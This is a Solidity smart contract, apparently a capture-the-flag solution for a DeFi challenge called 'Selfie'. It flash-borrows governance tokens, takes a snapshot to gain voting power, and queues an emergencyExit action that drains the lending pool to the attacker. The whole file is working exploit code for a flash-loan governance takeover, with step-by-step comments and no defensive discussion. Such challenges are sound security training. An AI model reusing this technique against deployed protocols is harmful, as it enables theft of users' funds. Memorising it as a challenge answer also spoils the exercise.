// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
}

interface IGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}

interface IERC20Snapshot is IERC20 {
    function snapshot() external returns (uint256 lastSnapshotId);
}

contract AttackSelfie {

    // 1. Request a flash loan of all the tokens
    // 2. Queue a new action - emergencyExit(address player)
    // 3. Pay back the loan
    // 4. Wait 2 days
    // 5. Execute the action

    address immutable player;
    IPool immutable pool;
    IGovernance immutable governance;
    IERC20Snapshot immutable token;
    uint256 constant AMOUNT = 1_500_000 ether;

    constructor(address _pool, address _governance, address _token){
        player = msg.sender;
        pool = IPool(_pool);
        governance = IGovernance(_governance);
        token = IERC20Snapshot(_token);
    }

    function attack() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)), address(token), AMOUNT, "0x111"
        );
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns(bytes32) {
        require(tx.origin == player);
        require(msg.sender == address(pool));

        token.snapshot();

        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), AMOUNT);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}